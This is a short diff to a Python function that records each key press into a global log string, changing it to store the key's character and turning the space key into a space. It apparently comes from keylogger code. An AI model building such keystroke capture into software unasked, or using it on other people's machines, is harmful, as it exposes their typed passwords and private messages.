@@ -5,7 +5,7 @@ log = ""
 def process_key_press(key):
     global log
     try:
-        log = log + str(key)
+        log = log + str(key.char)
     except:
         if key == key.space:
             log = log + " "
